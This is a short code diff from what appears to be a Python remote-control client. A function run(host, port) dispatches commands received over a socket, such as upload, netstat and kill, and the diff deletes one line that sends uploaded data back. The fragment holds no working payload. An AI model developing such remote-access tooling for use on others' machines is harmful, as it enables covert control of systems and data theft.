@@ -28,7 +28,6 @@ def run(host, port):
                 uploaded_data = upload(client_socket, command[7:])
                 if uploaded_data.startswith("[!] Error"):
                     continue
-                socket_send(uploaded_data)
             elif command == "netstat":
                 pass
             elif command[:4] == "kill":
